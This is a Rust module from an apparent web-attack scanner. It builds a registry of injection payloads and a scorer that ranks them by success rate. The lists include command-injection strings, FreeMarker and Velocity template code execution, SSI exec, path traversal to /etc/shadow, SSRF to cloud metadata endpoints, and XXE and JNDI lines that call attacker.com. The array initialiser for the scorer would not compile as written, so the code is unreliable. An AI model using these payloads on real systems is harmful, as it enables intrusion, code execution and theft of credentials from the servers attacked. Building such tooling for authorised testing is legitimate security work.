//! Evaluation and SSI Payload Templates Module
//!
//! Builds bounded evaluation and SSI payload templates with context-aware encoding.
//! Provides reusable payload dictionaries for server-side evaluation testing.

use std::collections::HashMap;

/// Maximum payload entries (bounded)
const MAX_PAYLOAD_ENTRIES: usize = 48;

/// Context type for payload selection
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EvalContext {
    UrlParameter,
    Header,
    Body,
    Cookie,
    Json,
    Xml,
}

/// Bounded payload template registry
#[derive(Debug, Clone)]
pub struct EvalPayloadRegistry {
    templates: HashMap<&'static str, Vec<&'static str>>,
}

impl EvalPayloadRegistry {
    pub fn new() -> Self {
        let mut templates = HashMap::new();

        // SSTI payloads by technology
        templates.insert("ssti_jinja2", vec![
            "{{7*7}}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "{% for c in [].__class__.__base__.__subclasses__() %}{{c}}{% endfor %}",
        ]);

        templates.insert("ssti_freemarker", vec![
            "${7*7}",
            "${freemarker.template.utility.Execute?new()(\"id\")}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        ]);

        templates.insert("ssti_velocity", vec![
            "#set($str=$class.forName(\"java.lang.String\").constructor)",
            "$str.newInstance(\"id\").execute()",
        ]);

        templates.insert("ssti_twig", vec![
            "{{_request.attributes}}",
            "{{app.request.server.all}}",
            "{{dump(app)}}",
        ]);

        // Command injection payloads
        templates.insert("cmd_injection", vec![
            "; id",
            "| id",
            "&& id",
            "`id`",
            "$(id)",
            "%0Aid",
            "%0Did",
            "|whoami",
            ";whoami",
        ]);

        // Path traversal payloads
        templates.insert("path_traversal", vec![
            "../",
            "..\\",
            "..%2f",
            "..%5c",
            "%2e%2e%2f",
            "%2e%2e/",
            "....//",
            "..;/",
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]);

        // SSI payloads
        templates.insert("ssi", vec![
            "<!--#exec cmd=\"id\" -->",
            "<!--#exec cmd=\"whoami\" -->",
            "<!--#include file=\"/etc/passwd\" -->",
            "<!--#include virtual=\"/\" -->",
            "<!--#echo var=\"DOCUMENT_ROOT\" -->",
            "<!--#printenv -->",
            "<!--#config errmsg=\"visible\" -->",
        ]);

        // XXE payloads
        templates.insert("xxe", vec![
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]>",
        ]);

        // SSRF payloads
        templates.insert("ssrf", vec![
            "http://localhost:80",
            "http://127.0.0.1:80",
            "http://[::]:80/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "dict://internal:11211/",
            "file:///etc/passwd",
            "gopher://localhost:6379/_INFO",
        ]);

        // LDAP injection
        templates.insert("ldap", vec![
            "*)(&",
            ")(cn=",
            "*()|&",
            "admin*)(objectClass=*",
            ")(|(uid=*))",
        ]);

        // NoSQL injection
        templates.insert("nosql", vec![
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$regex\": \".*\"}",
            "{\"$where\": \"this.username == 'admin'\"}",
        ]);

        // XPath injection
        templates.insert("xpath", vec![
            "' or '1'='1",
            "' or ''='",
            "@id or ''=''",
            "x' or name()='username' or '",
        ]);

        Self { templates }
    }

    /// Get payloads for a specific category
    pub fn get_payloads(&self, category: &str) -> Vec<&str> {
        self.templates.get(category).cloned().unwrap_or_default()
    }

    /// Get all available categories
    pub fn categories(&self) -> Vec<&str> {
        self.templates.keys().cloned().collect()
    }

    /// Get context-appropriate payloads
    pub fn get_context_payloads(&self, context: EvalContext) -> Vec<&str> {
        match context {
            EvalContext::UrlParameter => {
                // URL-safe encoded payloads
                vec![
                    "%3Cscript%3Ealert(1)%3C/script%3E",
                    "%27%20OR%20%271%27%3D%271",
                    "..%2f..%2f..%2fetc%2fpasswd",
                    "%24%7B7%2A7%7D",
                ]
            }
            EvalContext::Header => {
                // Header-safe payloads
                vec![
                    "<!--#exec cmd=\"id\" -->",
                    "${jndi:ldap://attacker.com/a}",
                    "test@example.com\\r\\nX-Injected: value",
                ]
            }
            EvalContext::Body => {
                // Full payloads for body
                let mut payloads = Vec::new();
                for cat in ["ssti_jinja2", "cmd_injection", "ssi"] {
                    payloads.extend(self.get_payloads(cat));
                }
                payloads
            }
            EvalContext::Cookie => {
                vec![
                    "session=<script>alert(1)</script>",
                    "user=admin'--",
                    "data=${7*7}",
                ]
            }
            EvalContext::Json => {
                vec![
                    "{\"key\": \"${7*7}\"}",
                    "{\"key\": \"<script>alert(1)</script>\"}",
                    "{\"$ne\": null}",
                ]
            }
            EvalContext::Xml => {
                vec![
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<root><!--#exec cmd=\"id\" --></root>",
                ]
            }
        }
    }

    /// Encode payload for specific context
    pub fn encode_for_context(&self, payload: &str, context: EvalContext) -> String {
        match context {
            EvalContext::UrlParameter => {
                urlencoding::encode(payload).to_string()
            }
            EvalContext::Header => {
                payload.to_string()
            }
            EvalContext::Body => {
                payload.to_string()
            }
            EvalContext::Cookie => {
                urlencoding::encode(payload).to_string()
            }
            EvalContext::Json => {
                serde_json::to_string(payload).unwrap_or_else(|_| payload.to_string())
            }
            EvalContext::Xml => {
                payload.replace("&", "&amp;")
                    .replace("<", "&lt;")
                    .replace(">", "&gt;")
                    .replace("\"", "&quot;")
            }
        }
    }
}

impl Default for EvalPayloadRegistry {
    fn default() -> Self {
        Self::new()
    }
}

/// Payload scoring for learning engine
#[derive(Debug, Clone)]
pub struct PayloadScore {
    pub payload: String,
    pub success_count: u32,
    pub failure_count: u32,
    pub last_used: u64,
}

impl PayloadScore {
    pub fn new(payload: String) -> Self {
        Self {
            payload,
            success_count: 0,
            failure_count: 0,
            last_used: 0,
        }
    }

    pub fn record_success(&mut self) {
        self.success_count += 1;
    }

    pub fn record_failure(&mut self) {
        self.failure_count += 1;
    }

    pub fn success_rate(&self) -> f32 {
        let total = self.success_count + self.failure_count;
        if total == 0 {
            0.0
        } else {
            self.success_count as f32 / total as f32
        }
    }
}

/// Bounded payload scorer
pub struct PayloadScorer {
    scores: [Option<PayloadScore>; MAX_PAYLOAD_ENTRIES],
    count: usize,
}

impl PayloadScorer {
    pub fn new() -> Self {
        Self {
            scores: [None; MAX_PAYLOAD_ENTRIES],
            count: 0,
        }
    }

    pub fn add_payload(&mut self, payload: String) {
        if self.count < MAX_PAYLOAD_ENTRIES {
            self.scores[self.count] = Some(PayloadScore::new(payload));
            self.count += 1;
        }
    }

    pub fn record_result(&mut self, payload: &str, success: bool) {
        for score in self.scores[..self.count].iter_mut().flatten() {
            if score.payload == payload {
                if success {
                    score.record_success();
                } else {
                    score.record_failure();
                }
                break;
            }
        }
    }

    pub fn get_top_payloads(&self, limit: usize) -> Vec<&str> {
        let mut scored: Vec<_> = self.scores[..self.count]
            .iter()
            .flatten()
            .collect();
        
        scored.sort_by(|a, b| {
            b.success_rate().partial_cmp(&a.success_rate()).unwrap_or(std::cmp::Ordering::Equal)
        });

        scored[..limit.min(scored.len())]
            .iter()
            .map(|s| s.payload.as_str())
            .collect()
    }
}

impl Default for PayloadScorer {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_registry_creation() {
        let registry = EvalPayloadRegistry::new();
        assert!(!registry.categories().is_empty());
    }

    #[test]
    fn test_context_payloads() {
        let registry = EvalPayloadRegistry::new();
        
        let url_payloads = registry.get_context_payloads(EvalContext::UrlParameter);
        assert!(!url_payloads.is_empty());
        
        let json_payloads = registry.get_context_payloads(EvalContext::Json);
        assert!(!json_payloads.is_empty());
    }

    #[test]
    fn test_payload_scorer() {
        let mut scorer = PayloadScorer::new();
        
        scorer.add_payload("payload1".to_string());
        scorer.add_payload("payload2".to_string());
        
        scorer.record_result("payload1", true);
        scorer.record_result("payload2", false);
        
        let top = scorer.get_top_payloads(1);
        assert_eq!(top.len(), 1);
        assert_eq!(top[0], "payload1");
    }

    #[test]
    fn test_bounded_storage() {
        let scorer = PayloadScorer::new();
        assert!(std::mem::size_of::<PayloadScorer>() <= 4096);
    }
}
